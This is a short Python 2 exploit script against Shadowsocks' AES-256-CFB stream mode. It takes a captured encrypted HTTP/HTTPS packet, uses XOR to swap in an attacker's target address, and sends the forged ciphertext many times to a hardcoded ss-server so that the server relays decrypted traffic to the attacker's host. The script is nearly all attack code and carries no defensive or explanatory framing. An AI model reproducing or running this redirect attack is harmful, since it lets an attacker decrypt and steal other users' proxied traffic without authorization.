import time
def xor(s1,s2):
	n=len(s1)
	r=''
	for i in range(n):
		r+=chr(ord(s1[i])^ord(s2[i]))
	return r
method='aes-256-cfb'
def up(c):
    l=16-len(c)%16
    c=c+'\x00'*l
    return c
#c is a capture http packet.
c='b338f754455478c1fdb1dc11f300050ce303ea8d9bdfdd2afa64cf257184c0e79f1b10f528abaa'
c=c.decode('hex')
c=up(c)
c1='8a6db90928015d006b6f1998dcc71e19a25e201ca2a2560dc99ccfa48e8d300723af80bbbf2ecfb154c3fa67c05450874c279efe990fe85a516e1d25a94cf4848997a8ecfb0b339f7e50f805fb79ab97c370fab07751da5e72059fd28a5977635400e7d87d1dd69ca5bfc6af3f9b41bd07062365ad4cf1feef7eeb5d79ec0f1c6b1f2c62489cd319fa1138dd271aea22747463ae3e1aa5e2aea6ec519715431cd6b94ca1677878eb3ab5436b04f505b4aeb73f46bb8a665d4bc9d7d6eff180fabbd8e1f052876f48bfa48ba63c2941eaec73f72593572d8d1125e2b0fbd327d99c1e54921fe70007a0fcfdc174cba65ba1984f44f8f78bd372e0f8aa09c65e0189e587b1875e791a583830d02e5d25067e1932743cc889dd5efe73fa3b034668cb7970cf344a557e82bc3bfdb669943586cb14a5c0baded64eb4388b5df920db87006ac2341c8cb40a6c4b4cfff6de0851e6dee1527556a2cbfff423051856120e1533d53cefa468577dbda680f4a29fab203dc1b4072ae0bd48810b5ec3d9830ecad310c7ee63bb6c10aa1a9e8718b2b6b1a651a8f65649604258b1ed508928c4259c35496c9eeb6c924891101212c1f73d254d843322863f00af45743b674eb34c1a28abc74e7373d6376ebeff346ec7e1b8698a2cb812a64b00c24ada0df99d76241916c093e0d03bbf6ffff8463db25b52e75c2dbcc5a80ccc203d052eec6b9a3043dc5667cf3fbaeebe8d2d20c767b77b51c64bc73a706f16f6a2b851e24d99b1ec66bfec'
c=c+c1.decode('hex')
prefix_http='HTTP/1.'
prefix_https_send='\x16\x03\x01\x02\x00\x01\x00'
#targetIP='\x01\xc0\xa8\x01\x03\x12\x12'# malicous target IP address: 192.168.1.3:4626
#targetIP='\x01\x23\xbd\xa0\x6b\x1f\x90'
import socket
y=c[16:16+7]
serverip="13.70.25.143"
serverport=8080
targetIP='\x01\x2f\x34\xab\x43\x12\x12'
for i in range(60,120,1):
	prefix_https_recv='\x16\x03\x03\x01'+chr(i)+'\x02\x00'
	x=xor(prefix_https_recv,targetIP)
	z=xor(x,y)
	cipertext=c[0:16]+z+c[16+7:]
	obj = socket.socket()
	obj.connect((serverip,serverport))# ss-server is running on 192.168.1.2:8899
	print (i)
	obj.send(cipertext)# send the payload to construct a redirect tunnel
	time.sleep(0.2)
for i in range(0,0,1):
        prefix_https_recv='\x16\x03\x03\x00'+chr(i)+'\x02\x00'
	x=xor(prefix_https_recv,targetIP)
	z=xor(x,y)
	cipertext=c[0:16]+z+c[16+7:]
	obj = socket.socket()
	obj.connect((serverip,serverport))# ss-server is running on 192.168.1.2:8899
	print (i)
	obj.send(cipertext)# send the payload to construct a redirect tunnel
	time.sleep(0.2)
